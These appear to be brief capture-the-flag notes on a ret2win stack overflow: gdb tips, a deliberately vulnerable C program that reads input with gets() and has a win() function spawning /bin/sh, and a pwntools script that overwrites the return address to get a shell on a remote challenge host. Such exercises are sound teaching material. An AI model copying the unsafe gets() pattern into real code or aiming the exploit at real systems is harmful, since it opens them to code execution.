## ret2win

find win addres using gdb and **disass win** or **objdump -d main**
Find return address using cyclic send and find it using gdb

## gdb
```
c -> continue
ni -> next instruction
disass <ime> -> dissasembly
x/<num>gx <addr>
```
### main.c
```
#include <stdio.h>

#include <stdlib.h>

  

void win()

{

  system("/bin/sh");

}

  

int main()

{

  setvbuf(stdin, NULL, _IONBF, 0);

  setvbuf(stdout, NULL, _IONBF, 0);

  setvbuf(stderr, NULL, _IONBF, 0);

  

  char name[64];

  printf("What's your name? ");

  gets(name);

  printf("Hello, %s!\n", name);

  return 0;

}
```

### sol.py
```
from pwn import *

  

#p = process('./main')

#p = gdb.debug('./main', gdbscript='''

#    b *main

#''')

  

#p.sendline(cyclic(100))

  

p = remote('inst-cybhr78dmd.tls.vuln.si', 443, ssl=True) # Remote challenge on the instancer

  

length = cyclic_find(0x6161617461616173)

print(f'Length: {length}')

  

payload = b'A' * length + p64(0x40119e) # win() address + 8 da preskocimo push rbp

p.sendline(payload)

  

p.interactive()
```